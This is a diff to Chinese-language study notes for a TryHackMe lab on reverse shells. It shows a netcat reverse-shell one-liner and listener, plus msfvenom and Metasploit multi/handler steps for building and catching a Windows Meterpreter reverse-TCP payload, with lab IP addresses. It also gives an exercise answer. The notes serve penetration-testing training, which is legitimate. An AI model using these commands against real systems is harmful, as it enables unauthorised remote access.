@@ -1,5 +1,6 @@
 ### webshell
 
+#### 本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells
 1. 尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：`nc <LOCAL-IP> <PORT> -e /bin/bash`将反向 shell 发送回您自己计算机上等待的侦听器。
 
   - `nc -nlvp 1234`
@@ -73,4 +74,23 @@
   - 成功建立Socat反向shell  
 
 6. 使用 msfvenom 创建 64 位 Windows Meterpreter shell 并将其上传到 Windows Target。激活 shell 并使用 multi/handler 捕获它。尝试一下这个 shell 的功能。
-   
+ - 目标机ip：10.10.245.66  
+  攻击机ip：10.10.244.218
+ - 使用 msfvenom创建payload(包括 shell)的语法如下:  
+  `msfvenom -p <PAYLOAD> <OPTIONS>`  
+  在攻击机上运行(会生成一个shell.exe)：
+  `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.244.218 LPORT=12345`
+  - 在攻击机上执行以下操作来设置 multi/handler:  
+   1. 使用 `msfconsole` 命令打开 Metasploit
+   2. 输入命令: `use multi/handler`
+   3. 输入 `show options` 命令来查看不同的选项
+   4. 设置PAYLOAD参数 (`set payload windows/x64/meterpreter/reverse_tcp`), LHOST参数 (攻击机ip)(`set LHOST 10.10.244.218`) 以及LPORT参数(`set LPORT 12345`)
+  - 在目标机器上调用shell.exe文件
+  - 在攻击机界面获得一个Meterpreter shell  
+
+7. 为任一目标创建分阶段和无阶段的 meterpreter shell。上传并手动激活它们，用netcat捕获 shell——这有效吗？  
+  不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。
+
+
+
+  参考文章：[【THM】What the shell？-学习(下)](https://www.cnblogs.com/Hekeats-L/p/16769018.html)
